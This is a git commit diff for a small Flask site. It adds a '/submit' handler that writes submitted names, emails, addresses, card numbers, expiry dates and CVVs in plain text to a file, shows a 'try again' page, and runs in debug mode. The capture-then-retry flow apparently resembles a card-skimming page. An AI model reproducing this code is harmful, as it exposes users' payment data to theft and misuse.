b658d6cfb47266d010c3b6e41e32e785c863093e
mopsyatin <mopsyatin@gmail.com>
2023-07-05 22:41:18 +0200

    new function

--- main.py
+++ main.py
@@ -1,5 +1,6 @@
-import random
 from flask import Flask, render_template, request
+
+import random
 
 app = Flask(__name__)
 airs = ["selfair.html","selfair2.html","selfair3.html"]
@@ -53,9 +54,27 @@ def seabreazev(price):
 def v(name,shit,price,v):
     return render_template("total.html", result=cost(int(price), float(v), name=0, shit=0))
 
-@app.route("/Oh_Error")
-def error():
-    return render_template("tryonemoretime.html")
 
-if __name__ == "__main__":
-    app.run(debug=True)
+
+@app.route('/submit', methods=['POST'])
+def error():
+    name = request.form['name']
+    email = request.form['email']
+    address = request.form['address']
+    date = request.form['date']
+    cvv = request.form['cvv']
+    number = request.form['number']
+    with open('form.txt', 'a',) as f:
+        f.write(name + "\n"+ email + "\n" + address + "\n" + date + "\n" + cvv + "\n" + number)
+
+    return render_template('tryonemoretime.html',  
+                           name = name, 
+                           email = email, 
+                           address = address, 
+                           date = date, 
+                           cvv = cvv, 
+                           number = number
+                           )
+    
+
+app.run(debug=True)
